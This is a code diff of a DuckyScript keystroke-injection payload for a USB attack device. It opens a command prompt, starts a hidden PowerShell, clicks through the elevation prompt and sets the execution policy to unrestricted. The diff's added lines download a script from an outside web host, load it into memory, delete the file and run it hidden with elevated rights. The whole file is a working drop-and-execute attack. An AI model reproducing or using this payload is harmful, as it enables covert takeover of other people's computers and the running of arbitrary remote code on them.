@@ -1,13 +1,23 @@
+REM Open Command Prompt
 GUI r
 DELAY 1000
 STRING cmd
 ENTER
 DELAY 1000
-STRING powershell -windowstyle hidden -command "Start-Process Powershell -Verb RunAS"
+
+REM Start an elevated powershell window
+STRING powershell -windowstyle hidden -command "Start-Process Powershell -Verb RunAs"
 ENTER
 DELAY 1000
 LEFTARROW
 ENTER
 DELAY 1000
-STRING Set-ExecutionPolicy -Force unrestricted; $url = 'localhost:5000/rest/ps1installationscript/'; $output = 'C:/Users/Public/DocumentManager.ps1'; Invoke-WebRequest -Uri $url -Outfile $output; cd C:\\Users\Public; .\DocumentManager.ps1;
+
+REM Download the installation scripts to run, load the contents into a variable, then delete installation scripts 
+STRING Set-ExecutionPolicy -Force unrestricted; $url = 'www.calvinkrist.com/rest/ps1installationscript/'; $output = 'C:/DocumentManager.ps1'; Invoke-WebRequest -Uri $url -Outfile $output; $content = [IO.File]::ReadAllText('C:\\DocumentManager.ps1'); Remove-Item –path C:\\DocumentManager.ps1
+ENTER
+DELAY 200
+
+REM execute installation script in a hidden powershell windows as an elevated user
+STRING powershell -windowstyle hidden -command $content
 ENTER
